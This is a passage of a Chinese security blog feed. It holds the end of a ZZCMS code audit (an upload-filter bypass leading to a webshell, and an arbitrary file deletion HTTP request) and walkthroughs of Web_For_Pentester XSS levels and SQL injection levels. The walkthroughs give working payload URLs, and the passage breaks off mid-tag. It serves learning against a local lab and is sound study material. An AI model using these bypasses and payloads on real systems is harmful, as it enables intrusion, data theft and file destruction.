class="string">"&lt;script&gt;alert('文件大小超过了限制！最大只能上传 "</span>.<span class="keyword">$this</span>-&gt;max_file_size.<span class="string">" K的文件');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查文件类型</span></span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="keyword">$this</span>-&gt;fileName[<span class="string">"type"</span>], <span class="keyword">$this</span>-&gt;uptypes)) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('文件类型错误，支持的图片类型为：jpg,gif,png,bmp');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查文件后缀</span></span><br><span class="line">$hzm=strtolower(substr(<span class="keyword">$this</span>-&gt;fileName[<span class="string">"name"</span>],strpos(<span class="keyword">$this</span>-&gt;fileName[<span class="string">"name"</span>],<span class="string">"."</span>)));<span class="comment">//获取.后面的后缀，如可获取到.php.gif</span></span><br><span class="line"><span class="keyword">if</span> (strpos($hzm,<span class="string">"php"</span>)!==<span class="keyword">false</span> || strpos($hzm,<span class="string">"asp"</span>)!==<span class="keyword">false</span> ||strpos($hzm,<span class="string">"jsp"</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('"</span>.$hzm.<span class="string">"，这种文件不允许上传');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该文件中，可以找到后端对上传文件验证的代码，有四个步骤的验证，第一是检查是否存在上传的文件，第二是检查文件的大小，第三是检查文件类型必须是规定的图片类型，见第12行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $uptypes = <span class="keyword">array</span> (<span class="string">'image/jpg'</span>,<span class="string">'image/jpeg'</span>,<span class="string">'image/pjpeg'</span>,<span class="string">'image/gif'</span>,<span class="string">'image/png'</span>,<span class="string">'image/x-png'</span>,<span class="string">'image/bmp'</span>,<span class="string">'application/x-shockwave-flash'</span>);</span><br></pre></td></tr></table></figure><p>最后检查的是文件后缀，禁止后缀名包含php，asp和jsp的文件，但是它忽略了phtml文件，而apache会将phtml文件当做php文件来解析，所以我们只需要将文件名后缀修改为phtml，文件类型修改为image/jpg，即可以成功绕过过滤上传一句话木马文件</p><h4 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h4><p>根据上面的分析，我修改了如下的payload</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/zzcms/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是可以发现上传失败了，提示了“经判断上传的文件不是图片文件，已删除”，根据提示在原文件找到之前忽略了的过滤点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/uploadimg.php 第58-61行</span></span><br><span class="line">$data=GetImageSize($newName);<span class="comment">//取得GIF、JPEG、PNG或SWF图片属性，返回数组，图形的宽度[0],图形的高度[1]，文件类型[2]</span></span><br><span class="line"><span class="keyword">if</span>($data[<span class="number">2</span>]!=<span class="number">1</span> &amp;&amp; $data[<span class="number">2</span>]!=<span class="number">2</span> &amp;&amp; $data[<span class="number">2</span>]!=<span class="number">3</span> &amp;&amp; $data[<span class="number">2</span>]!=<span class="number">6</span>)&#123;<span class="comment">//4为swf格式</span></span><br><span class="line">unlink($newName);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('经判断上传的文件不是图片文件，已删除。');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><p>我们可以注意到一个函数<strong>GetImageSize</strong>，这个函数可以取得图片的各个属性，之后就可以判断该文件是否是一个图片文件。所以这里在文件的内容头部加入<strong>GIF89A</strong>，以此来绕过<strong>GetImageSize</strong>的检查，如下所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/zzcms/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>修改后成功上传一句话木马文件，并在返回内容我们可以很清晰的看出上传文件的具体位置</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/zzcms/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后上菜刀验证</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/zzcms/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功getshell</p><h3 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h3><h4 id="位置-5"><a href="#位置-5" class="headerlink" title="位置"></a>位置</h4><p>/user/adv.php 第76-85行</p><h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/user/adv.php </span></span><br><span class="line">......</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"img"</span>]))&#123;</span><br><span class="line">$img=$_REQUEST[<span class="string">"img"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$img=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"oldimg"</span>]))&#123;</span><br><span class="line">$oldimg=$_REQUEST[<span class="string">"oldimg"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$oldimg=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ($action==<span class="string">"modify"</span>)&#123;</span><br><span class="line">query(<span class="string">"update zzcms_textadv set adv='$adv',company='$company',advlink='$advlink',img='$img',passed=0 where username='"</span>.$_COOKIE[<span class="string">"UserName"</span>].<span class="string">"'"</span>);</span><br><span class="line"><span class="keyword">if</span> ($oldimg&lt;&gt;$img)&#123;</span><br><span class="line">$f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line"><span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">unlink($f);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以发现变量$f是通过”../“与变量$oldimg拼接而成的，拼接后的文件名如果存在就通过unlink函数进行文件删除操作，而这里对变量$olding没有什么其他的过滤，只要求不等于变量$img，且$action等于”modify”，那么我们就可以通过控制变量$olding的值进行任意文件删除</p><h4 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h4><p>我们先在网站根目录下创建一个文件夹，里面新建文件1.php，2.txt</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/zzcms/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后构造如下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /user/adv.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947; UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 41</span><br><span class="line"></span><br><span class="line">action=modify&amp;img=test&amp;oldimg=demo/1.php</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/zzcms/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这是第一次审计一个完整的cms，大部分还是参考网上前辈们的文章来审计，感受到自己独立审计的能力还有很大的不足，今后还需要通过多练，多花时间来加强自己的审计能力。</p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Web_For_Pentester-XSS</title>
    <link href="https://Foxgrin.github.io//posts/22876/"/>
    <id>https://Foxgrin.github.io//posts/22876/</id>
    <published>2019-01-29T08:26:00.000Z</published>
    <updated>2019-01-30T09:02:45.172Z</updated>
    
    <content type="html"><![CDATA[<p>Web_For_Pentester渗透测试环境中的xss注入关卡部分<a id="more"></a></p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>典型的<strong>反射型XSS</strong>，将我们通过<strong>GET</strong>方式输入的参数<strong>name</strong>直接输出</p><p>payload:<a href="http://192.168.187.141/xss/example1.php?name=%3Cscript%3Ealert(%27xss%27)%3C/script%3E" target="_blank" rel="noopener">http://192.168.187.141/xss/example1.php?name=%3Cscript%3Ealert(%27xss%27)%3C/script%3E</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>对<strong>GET</strong>方式输入的参数<strong>name</strong>进行正则匹配过滤，使用了函数<strong>preg_replace</strong>过滤了script标签：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">$name = preg_replace(<span class="string">"/&lt;script&gt;/"</span>,<span class="string">""</span>,$name);</span><br><span class="line">$name = preg_replace(<span class="string">"/&lt;\/script&gt;/"</span>,<span class="string">""</span>,$name);</span><br></pre></td></tr></table></figure><p>但我们知道<strong>preg_replace</strong>是非常不安全的，有非常多的方法可以绕过，这里我们只需要利用大写即可非常轻松的绕过过滤</p><p>payload:<a href="http://192.168.187.141/xss/example2.php?name=%3CScript%3Ealert(%27xss%27)%3C/Script%3E" target="_blank" rel="noopener">http://192.168.187.141/xss/example2.php?name=%3CScript%3Ealert(%27xss%27)%3C/Script%3E</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这关同样是正则匹配过滤，区别于上一关的是这里用了匹配修饰符<strong>/i</strong>，所以不论大小写都会被过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">$name = preg_replace(<span class="string">"/&lt;script&gt;/i"</span>,<span class="string">""</span>,$name);</span><br><span class="line">$name = preg_replace(<span class="string">"/&lt;\/script&gt;/i"</span>,<span class="string">""</span>,$name);</span><br></pre></td></tr></table></figure><p>所以我们换一种方式，双写即可绕过</p><p>payload:<a href="http://192.168.187.141/xss/example3.php?name=%3Cs%3Cscript%3Ecript%3Ealert(%27xss%27)%3C/s%3C/script%3Ecript%3E" target="_blank" rel="noopener">http://192.168.187.141/xss/example3.php?name=%3Cs%3Cscript%3Ecript%3Ealert(%27xss%27)%3C/s%3C/script%3Ecript%3E</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这关通过正则匹配过滤了关键字<strong>script</strong>，并且通过修饰符<strong>/i</strong>无视大小写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/script/i"</span>,$_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>排除script，我们还可以通过<strong>onerror</strong>事件进行xss攻击</p><p>payload:</p><p><a href="http://192.168.187.141/xss/example4.php?name=%3Cimg%20src=1%20onerror=alert(%22xss%22)%3E" target="_blank" rel="noopener">http://192.168.187.141/xss/example4.php?name=%3Cimg%20src=1%20onerror=alert(%22xss%22)%3E</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5"></a>Example 5</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>过滤了关键字<strong>alert</strong>，但是<strong>script</strong>未被过滤，除了<strong>alert</strong>外还有其他方法，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert() 弹出个提示框 （确定） </span><br><span class="line">confirm() 弹出个确认框 （确定，取消） </span><br><span class="line">prompt() 弹出个输入框 让你输入东西</span><br></pre></td></tr></table></figure><p>payload:</p><p><a href="http://192.168.187.141/xss/example5.php?name=%3Cscript%3Econfirm(%27xss%27)%3C/script%3E" target="_blank" rel="noopener">http://192.168.187.141/xss/example5.php?name=%3Cscript%3Econfirm(%27xss%27)%3C/script%3E</a></p><p><a href="http://192.168.187.141/xss/example5.php?name=%3Cscript%3Eprompt(%27xss%27)%3C/script%3E" target="_blank" rel="noopener">http://192.168.187.141/xss/example5.php?name=%3Cscript%3Eprompt(%27xss%27)%3C/script%3E</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Example-6"><a href="#Example-6" class="headerlink" title="Example 6"></a>Example 6</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这关是直接将我们输入的参数<strong>name</strong>的值赋值给脚本变量<strong>a</strong>，从页面源代码也可以看出</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var $a= "hacker";</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>payload：</p><p><a href="http://192.168.187.141/xss/example6.php?name=hacker%22;alert(%27xss%27);//" target="_blank" rel="noopener">http://192.168.187.141/xss/example6.php?name=hacker%22;alert(%27xss%27);//</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Example-7"><a href="#Example-7" class="headerlink" title="Example 7"></a>Example 7</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这关区别在于是通过单引号闭合，所以将上一关的payload中的双引号改为单引号即可</p><p>payload：</p><p><a href="http://192.168.187.141/xss/example7.php?name=hacker%27;alert(%27xss%27);//" target="_blank" rel="noopener">http://192.168.187.141/xss/example7.php?name=hacker%27;alert(%27xss%27);//</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Example-8"><a href="#Example-8" class="headerlink" title="Example 8"></a>Example 8</h3><p>本关的源代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">  require_once &apos;../header.php&apos;; </span><br><span class="line"></span><br><span class="line">  if (isset($_POST[&quot;name&quot;])) &#123;</span><br><span class="line">    echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;]);</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;]; ?&gt;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">   </span><br><span class="line">  require_once &apos;../footer.php&apos;; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可有发现参数<strong>name</strong>经过<strong>htmlentities</strong>函数处理，这是一个可以将html标签的尖括号转义的函数，所以我们无法通过参数<strong>name</strong>进行xss攻击，仔细一看这里面还有一个可控的参数<strong>$_SERVER[‘PHP_SELF’]</strong>，来看看PHP手册对这个参数的说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;PHP_SELF&apos;</span><br><span class="line">当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://example.com/foo/bar.php 的脚本中使用 $_SERVER[&apos;PHP_SELF&apos;] 将得到 /foo/bar.php。__FILE__ 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。</span><br></pre></td></tr></table></figure><p>所以我们可以通过改变<strong>url</strong>来改变这个变量的值</p><p>payload：</p><p><a href="http://192.168.187.141/xss/example8.php/%22%20method=%22POST%22%3E%20%3Cscript%3Ealert(&#39;xss&#39;)%3C/script%3E" target="_blank" rel="noopener">http://192.168.187.141/xss/example8.php/%22%20method=%22POST%22%3E%20%3Cscript%3Ealert(&#39;xss&#39;)%3C/script%3E</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-XSS/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这时看一下页面的源代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/xss/example8.php/"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('xss')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>" method="POST"&gt;</span><br><span class="line">  Your name:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>成功插入恶意脚本代码</p><h3 id="Example-9"><a href="#Example-9" class="headerlink" title="Example 9"></a>Example 9</h3><p>源代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  document.write(location.hash.substring(1));</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>location.hash是指url中#后面的内容，substring(1)从第一个字符开始</p><p>payload:</p><p><a href="http://192.168.187.141/xss/example9.php#%3Cscript%3Ealert(&#39;xss&#39;)%3C/script%3E" target="_blank" rel="noopener">http://192.168.187.141/xss/example9.php#%3Cscript%3Ealert(&#39;xss&#39;)%3C/script%3E</a></p><p>但是这里没有弹框，有点奇怪</p>]]></content>
    
    <summary type="html">
    
      xss
    
    </summary>
    
      <category term="xss" scheme="https://Foxgrin.github.io/categories/xss/"/>
    
    
      <category term="xss" scheme="https://Foxgrin.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Web_For_Pentester-Sql_injection</title>
    <link href="https://Foxgrin.github.io//posts/18158/"/>
    <id>https://Foxgrin.github.io//posts/18158/</id>
    <published>2019-01-25T11:35:00.000Z</published>
    <updated>2019-01-29T08:21:43.767Z</updated>
    
    <content type="html"><![CDATA[<p>Web_For_Pentester渗透测试环境中的Sql注入关卡部分<a id="more"></a></p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><p>从页面初始的URL就可以看出注入点在于<strong>name</strong>参数，改变<strong>name</strong>参数的值为<strong>root’</strong>，发现没有查询结果，再次改变<strong>name</strong>参数值为<strong>root’%23</strong>，发现得到正确查询结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-Sql_injection/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>说明了参数<strong>name</strong>是被单引号包裹的，而且这里没有报错信息，于是直接采用联合注入即可</p><p>注出查询列数payload:<a href="http://192.168.187.141/sqli/example1.php?name=root%27%20order%20by%205%20%23" target="_blank" rel="noopener">http://192.168.187.141/sqli/example1.php?name=root%27%20order%20by%205%20%23</a></p><p>注出数据库名payload:<a href="http://192.168.187.141/sqli/example1.php?name=root%27%20union%20select%201,2,database(),4,5%23" target="_blank" rel="noopener">http://192.168.187.141/sqli/example1.php?name=root%27%20union%20select%201,2,database(),4,5%23</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-Sql_injection/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注出数据表名payload:<a href="http://192.168.187.141/sqli/example1.php?name=root%27%20union%20select%201,2,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),4,5%23" target="_blank" rel="noopener">http://192.168.187.141/sqli/example1.php?name=root%27%20union%20select%201,2,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),4,5%23</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-Sql_injection/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注出数据列名payload:<a href="http://192.168.187.141/sqli/example1.php?name=root%27%20union%20select%201,2,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),4,5%23" target="_blank" rel="noopener">http://192.168.187.141/sqli/example1.php?name=root%27%20union%20select%201,2,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),4,5%23</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-Sql_injection/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Example-2，3"><a href="#Example-2，3" class="headerlink" title="Example 2，3"></a>Example 2，3</h3><p>这关过滤了空格，用/**/来代替空格即可，payload跟第一关一样，空格替换一下即可</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-Sql_injection/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-Sql_injection/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>从这关源代码可以看出，参数<strong>id</strong>经过函数<strong>mysql_real_escape_string</strong>过滤，但是仔细看<strong>sql</strong>语句，我们可以发现这里参数<strong>id</strong>并没有任何引号的包裹，所以这个过滤函数实质上并不影响我们的注入过程，payload同样参考第一关即可</p><h3 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5"></a>Example 5</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-Sql_injection/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这关用到了一个正则匹配表达式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/^[0-9]+/'</span>)</span><br></pre></td></tr></table></figure><p>符合匹配的内容是<strong>开头</strong>是数字，但这里的参数<strong>id</strong>本来值本来就是数字，所以这个过滤其实没有多大影响，payload跟第四关是一样的</p><h3 id="Example-6"><a href="#Example-6" class="headerlink" title="Example 6"></a>Example 6</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-Sql_injection/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这关一样用到了正则匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/^[0-9]+$/'</span>)</span><br></pre></td></tr></table></figure><p>符合匹配的内容是<strong>结尾</strong>是数字</p><p>注出数据库名的payload:<a href="http://192.168.187.141/sqli/example6.php?id=2%20union%20select%201,2,database(),4,5" target="_blank" rel="noopener">http://192.168.187.141/sqli/example6.php?id=2%20union%20select%201,2,database(),4,5</a></p><h3 id="Example-7"><a href="#Example-7" class="headerlink" title="Example 7"></a>Example 7</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-Sql_injection/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这关的正则匹配式是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span 